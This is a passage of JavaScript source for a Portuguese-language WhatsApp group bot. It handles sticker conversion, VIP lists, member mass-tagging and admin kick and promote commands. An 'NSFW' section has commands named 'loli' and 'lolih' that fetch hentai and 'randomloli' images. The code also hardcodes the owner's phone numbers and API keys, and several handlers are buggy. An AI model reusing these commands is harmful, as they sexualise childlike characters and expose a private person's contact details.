.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isMedia && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
tomioka.sendMessage(from, `[ ! ]  ᴘᴏʀ ғᴀᴠᴏʀ ᴇsᴘᴇʀᴀ....`, MessageType.text, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
})
.on('end', async function () {
console.log('Finish')
const webpWithMetadata = await WSF.createSticker('PAQUETE', 'AUTOR', `./sticker/${sender}.webp`)
tomioka.sendMessage(from, webpWithMetadata, MessageType.sticker, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
enviar(`Envíe una foto/video + el comando ${prefix}sticker\n\nTambién funciona si mencionas una foto o video junto al mismo comando\n\nNota: La duración máxima del video es de 10 segundos`)
}
break*/
case 'amongus':
if (!isGroup) return enviar('só gp')
if (!isGroupAdmins) return enviar (ind.admin())
if (!isBotGroupAdmins) return enviar (ind.badmin())

if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar('Você precisa mencionar alguém')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus =
`.      　。　　　　•　    　ﾟ　　。
　　.　　　.　　　  　　.　　　　　。　　   。　.
　.　　      。　        ඞ   。　    .    •
•            @${mentioned[0].split('@')[0]} was E j e c t e d
1 impostor remain   。　.
　 　　。　　 　　　　ﾟ　　　.　      　　　.
,　　　　.                  .`
//tomioka.groupRemove(from, mentioned)
mentions(`${sus}`, mentioned, true)
break
case 'cst':
                
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)                                     
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('TOMIOKABOT', '554498220867')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
enviar(mess.wait())
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer1 = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer1, sticker, {quoted: tomio})
fs.unlinkSync(rano)
})
} else if ((isMedia && msg.message.videoMessage.seconds < 11 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
enviar('❬❗❭ Espera mano')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('TOMIOKABOT', '5544988116479')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer2 = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer2, sticker, {quoted: tomio})
fs.unlinkSync(rano)
})
} else {
enviar(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
break
case 'autofigu':						   
if (!isGroup) return enviar(`SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return enviar(`VOCÊ NÃO E ADMINISTRADOR DO GRUPO`)
if (args.length < 1) return enviar('1 para ativar ou 0 para desativar')
if (Number(args[0]) === 1) {
if (isAutofigu) return enviar('*[❗] ja esta ativado* !!!')
autofigu.push(from)
fs.writeFileSync('./database/group/autofigu.json', JSON.stringify(autofigu))
enviar('*❬ ✅ ❭ auto-figu ativado com sucesso neste grupo...*')
enviar('*Atencao a todos os membros ativos deste grupo o auto-figu esta ativado se você enviar alguma foto ou video, o bot ira fazer automaticamente uma figurinha*')
} else if (Number(args[0]) === 0) {
autofigu.splice(from, 1)
fs.writeFileSync('./database/group/autofigu.json', JSON.stringify(autofigu))
enviar('*❬ ❌ ❭ modo auto-figurinha desativado com sucesso neste grupo...*')
} else {
enviar(`*Use assim : 1 para ativar ou 0 para desativar*`)
}
break
///FIGURINHA TERMUX///
 case 'stiker':
case 'sticker':
case 'stickergif':
case 'stikergif':
case 'fig':
case 'gif':
case 'figura':
case 'figu':
case 'figurinha':
case 'f':
case 's':
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function(cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function(err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
enviar('erro')
})
.on('end', function() {

exec(`webpmux -set exif ${addMetadata('TIOTOMIOKA', '(44) 98220867')} ${ran} -o ${ran}`, async(error) => {
if (error) return enviar('erro')
tomioka.sendMessage(from, fs.readFileSync(ran), sticker, {
contextInfo: null, quoted: tomio, contextInfo: tome
})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(200,iw)':min'(200,ih)':force_original_aspect_ratio=decrease,fps=15, pad=200:200:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && msg.message.videoMessage.seconds < 11 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function(cmd) {

})
.on('error', function(err) {

fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar('erro')
})
.on('end', function() {


exec(`webpmux -set exif ${addMetadata('TIOTOMIOKA', '(44) 98220867')} ${ran} -o ${ran}`, async(error) => {
if (error) return enviar('erro')
tomioka.sendMessage(from, fs.readFileSync(ran), sticker, {contextInfo: null, quoted: tomio, contextInfo: tome})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(200,iw)':min'(200,ih)':force_original_aspect_ratio=decrease,fps=15, pad=200:200:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
enviar(`Primeiro vc precisa enviar a imagem, video ou gif de até 9 segundos, ai vc comenta com ${prefix}f`)
}
break
case 'dado':    
kapankah = body.slice(1)
const elu =['1','2','3','4','5','6']
const ule = elu[Math.floor(Math.random() * elu.length)]
tomioka.sendMessage(from, ule, text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'clearvp':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar ('*Este comando só pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.splice(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(premium))
vip = `❎Lista vip limpa com sucesso❎`
mentions(`${vip}`, mentioned, true)   
break
case 'addvip':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar ('*Este comando só pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.push(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(premium))
vip = `✅@${mentioned[0].split('@')[0]} Você virou Vip no TOMIOKA BOT✅`
mentions(`${vip}`, mentioned, true)   
break

case 'delvip':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar ('*Este comando só pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.splice(`${mentioned}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(premium))
vip = `❎@${mentioned[0].split('@')[0]} Você deixou de ser um membro Vip do TOMIOKA BOT❎`
mentions(`${vip}`, mentioned, true)   
break
case 'daftarvip': 
tomioka.sendMessage(from, daftarvip(prefix) , text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'nekopoi':   

tomioka.sendMessage(from, nekopoi(prefix) , text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'cekvip': 
if (!isPremium) return enviar ('só premium')
me = tomioka.user
uptime = process.uptime()
tomioka.sendMessage(from,  `*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*NOME DO BOT:* ꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n『 *𝐕𝐈𝐏 𝐔𝐒𝐄𝐑*』\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*•NÚMERO:* *${sender.split("@s.whatsapp.net")[0]}*\n*•STATUS:* *ATIVO*\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*STATUS BOT:* *${kyun(uptime)}*\n\n*VOCE É UM MEMBRO PREMIUM😍* \n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*` , text, { quoted: msg, })
break 
case 'bomdia':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://i.imgur.com/7VL9cFf.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Bom dia, vcs sao fodas ❤️'})
break
case 'boatarde':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://i.imgur.com/JaO3yoV.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Boa tarde, rapeize 😎👍'})
break
case 'hearth':      
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/wood-hearth?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'boanoite':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://i.imgur.com/yOFxSUR.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Boa noite fml ❤️'})
break
case 'lofi':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL9hZBPRo16fIhsIus3t1je2oAU23pQqBpfw&usqp=CAU`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: '️💆'})
break
case 'malkova':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtbo5EcVSGj-IvEVznHIgMZ9vjFptZfvprtg&usqp=CAU`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: '️💆'})
break
case 'canal':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
buffer = await getBuffer(`https://rbacelia.sirv.com/IMG-20210624-WA0373.jpg`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption:'*canal do Tomioka:*\n\n https://youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ', quoted: msg} )
break
//_COMANDOS NSFW
case 'loli':

enviar('*「 ❗ 」 Aguarde um pouco amigo, a procura da imagem...*')
anu = await axios.get('https://nekos.life/api/v2/img/neko')
loliz = await getBuffer(anu.data.url)
tomioka.sendMessage(from, loliz, image, {quoted: tomio, contextInfo: tome,contextInfo: null, caption: 'rum'})
break
case 'loli2':

enviar('*「 ❗ 」 Aguarde um pouco amigo, a procura da imagem...*')
anu = await axios.get('https://nekos.life/api/v2/img/fox_girl')
loliz = await getBuffer(anu.data.url)
tomioka.sendMessage(from, loliz, image, {quoted: tomio, contextInfo: tome,contextInfo: null, caption: 'rum'})
break
case 'neko':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)

memein = await kagApi.memeindo()
buffer = await getBuffer(`http://brizas-api.herokuapp.com/random/hentai/eroneko?apikey=brizaloka`)
tomioka.sendMessage(from, buffer, image, {quoted: tomio, contextInfo: tome, contextInfo: null, caption: 'Rum️'})
break
case 'hentai':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)

buffer = await getBuffer(`http://brizas-api.herokuapp.com/random/hentai/classic?apikey=brizaloka`)
tomioka.sendMessage(from, buffer, image, {quoted: tomio, contextInfo: tome, contextInfo: null, caption: 'rum'})
break
case 'boanoite':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://imgur.com/gallery/4HeRfuO`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'boa noite ❤️'})
break
case 'bomdia':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
memein = await kagApi.memeindo()
buffer = await getBuffer(`https://imgur.com/gallery/zFvzl2S`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'bom dia ❤️'})
break
case 'termux':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
meme = await kagApi.memes()
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgADDq_64EbTI0NroP7CUoVeWmu1J06NnGHw&usqp=CAU`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Terminal é um programa muito conhecido no mundo das distribuições Linux. Ele é uma ferramenta que facilita muito nas tarefas relacionadas ao sistema. Agora, já pensou em utilizar o Terminal Linux no seu Android? Esta é a proposta do Termux.\n\n*TERMUX: UTILIZE O TERMINAL NO SEU ANDROID*\n\nA utilização do Terminal aumenta muito a produtividade do usuário que já possui um determinado nível de conhecimento técnico.\nCom o terminal, é possível fazer diversas e diferentes coisas, desde navegar entre os diretórios e instalar programas, até descompactar arquivos e monitorar os processos.'})
break
case 'grupoinfo':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.updatePresence(from, Presence.composing)
if (!isGroup) return enviar ('só grupo')
ppUrl = await tomioka.getProfilePicture(from) // leave empty to get your own
buffer = await getBuffer(ppUrl)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${groupDesc}`})
break
case 'meme':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://imgur.com/gallery/rvz2dPi`, {method: 'get'})
ri = JSON.parse(JSON.stringify(anu));
ze =  ri[Math.floor(Math.random() * ri.length)];
nye = await getBuffer(ze)
tomioka.sendMessage(from, nye, image, { caption: 'cringe️', contextInfo: null, quoted: tomio, contextInfo: tome})

break
case 'rr':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
rate = body.slice(1)
ratee = ["Tac... Não disparou","Tac... Não disparou,ainda...","Tac💥 Disparou e você morreu","Tac💥Disparou mas a bala pegou de raspão","A arma falhou","Tac... Por pouco que não dispara...","Tac... A arma estava descarregada"]
const cu = ratee[Math.floor(Math.random() * ratee.length)]
tomioka.sendMessage(from, ''+ cu+'', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'bug':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const bug = body.slice(5)
if (args.length > 300) return tomioka.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: msg})
var nomor = msg.participant
teks1 = `[REPORT]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
var options = {
text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
enviar("Mensagem enviada ao meu dono; Spam = block + ban.")
break
case 'enviar':
if (isBanned) return enviar ('Desculpe, você foi pego!')
if (args.length < 1) return enviar (`O que você deseja solicitar? Exemplo: ${prefix}request fitur anime`)

const cfrr = body.slice(7)
if (cfrr.length > 300) return tomioka.sendMessage(from, text , 'Desculpe, o texto é muito longo, máximo de 300 textos')
const ress = `*[𝙨𝙪𝙜𝙚𝙨𝙩𝙖̃𝙤/𝙗𝙪𝙜]*\nNúmero : @${tonor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`

var options = {
text: ress,
contextInfo: {mentionedJid: [tonor]},
}
tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
enviar('SUA SOLICITAÇÃO ATINGEU O proprietário do BOT, Solicitações pals /main2 não serão respondidas. ')
break
case 'dono':
tomioka.sendMessage(from, {displayname: "TOMIOKA", vcard: vcard}, MessageType.contact, { quoted: tomio, contextInfo: tome})    
enviar (`*Caso esteja de whatsapp imune*\n\n*Segue o Wame do meu dono..*\n\n*Wa.me/5544998220867*`)
break
case 'setprefix':
if (!isOwner) return 
enviar(`*Qual o tipo de prefixo vc deseja?*

mensione a mensagem com a opção que deseja_

_- [Multi] Se deseja MultiPrefix_
_- [NoPref] se não deseja Prefix_
_- [Custom] escreva o novo prefix que deseja usar_
_- [Rest] devolver ao prefix principal_`)
break
case 'lolih':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
gatauda = body.slice(6)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=BotWeA`, {method: 'get'})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg})

break
case 'marcar':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*#* @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'marcar2':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `╠➥ @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
enviar(teks)
break
case 'marcar3':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
tomioka.sendMessage(from, teks, text, {detectLinks: false, quoted: msg})
break
case 'marcar4':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `╠➥ ${mem.jid.split('@')[0]}@s.whatsapp.net\n`
members_id.push(mem.jid)
}
tomioka.sendMessage(from, teks, text, {detectLinks: false, quoted: msg})
break
///_PROMOVER E REBAIXAR MARCANDO @
/*   case 'promover':
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Promovido com sucesso\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(from, mentioned, true)
tomioka.groupRemove(from, mentioned)
} else {
mentions(`Promovido com sucesso @${mentioned[0].split('@')[0]} Como administrador do grupo!`, mentioned, true)
tomioka.groupMakeAdmin(from, mentioned)
}
break
case 'rebaixar':
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Rebaixado com sucesso\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
tomioka.groupRemove(from, mentioned)
} else {
mentions(`Voce foi rebaixado @${mentioned[0].split('@')[0]} Agora você é só mais um membro comum!`, mentioned, true)
tomioka.groupDemoteAdmin(from, mentioned)
}
break */
///_PROMOVER E REBAIXAR MARCANDO MSG
case 'rebaixar': 
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupDemoteAdmin(from, M_exe)
} else {
tomioka.groupDemoteAdmin(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupDemoteAdmin(from, [exe1])
}
enviar("ok, chefe esse cara perdeu o adm!")
break

case 'promover': 
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupMakeAdmin(from, M_exe)
} else {
tomioka.groupMakeAdmin(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupMakeAdmin(from, [exe1])
}
enviar("ok, chefe esse cara agora e admin!")
break
case 'morte':
case 'death':
idde = ["30","76","90","72","83","73","83","74","92","100","94","48","37","53","63"]
idade = idde[Math.floor(Math.random() * (idde.length))]
morte = `Pessoas com este nome: ${pushname} \nTendem a morrer aos ${idade} anos de idade.`
enviar(morte)
break
case 'busc':
if(!isGroup)return enviar('só grupo')
if(!q) return enviar('O que você está procurando no YouTube?')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
datai = [];
try{
ysearch = await yts(q)
hdata = ysearch.all
}catch(e){
return enviar('erro')
}
num = 1
for(let i=0; i<hdata.length; i++){
datai.push({
"rows": [
{
"title": "#M",
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
"rowId": hdata[i].url
},
{
"title": "#MP4",
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
"rowId": hdata[i].url
}
], title: num})
num += 1
}
po = tomioka.prepareMessageFromContent(from, {
"listMessage":{
"title": "*YOUTUBE DOWNLOAD*",
"description": `Mandado por : ${pushname}\n*Resultado da pesquisa : ${q}*\n*Baixe clicando no botão abaixo*`,
"buttonText": "Result",
"listType": "SINGLE_SELECT",
"sections": datai}}, {}) 
tomioka.relayWAMessage(po, {waitForAck: true})
break
case 'sugerir':
if (args.length < 1) return enviar (`Oque você quer sugerir para meu criador?`)
const psn = body.slice(8)
var nmr = msg.participant
const tks1 = `[SUGESTÃO]\nNúmero : wa.me/${nmr.split('@s.whatsapp.net')[0]}\nMensagem : ${psn}`
var options = {
text: tks1,
contextInfo: {mentionedJid: [nmr]},
}
tomioka.sendMessage(`554498220867@s.whatsapp.net`, options, text, {quoted: tomio, contextInfo: tome})
enviar(`A sugestão foi relatada para meu criador, obrigado ${pushname}`)
break
/*case 'add':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (args.length < 1) return enviar ('Você quer adicionar? usa certo trem ')
if (args[0].startsWith('08')) return enviar ('Use o código do país, man')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
tomioka.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
enviar('Falha ao adicionar destino, talvez porque é privado')
}
break*/
case 'kik': 

if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.groupadmins> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupRemove(from, M_exe)
} else {
tomioka.groupRemove(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupRemove(from, [exe1])
}
tomioka.sendMessage("Alvo removido com sucesso")
break 
case 'banir':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('A marca-alvo que você quer chutar!')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Alvo removido com sucesso :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
tomioka.groupRemove(from, mentioned)
} else {
mentions(`Alvo removido com sucesso  : @${mentioned[0].split('@')[0]}`, mentioned, true)
tomioka.groupRemove(from, mentioned)
}
break
case 'admins':
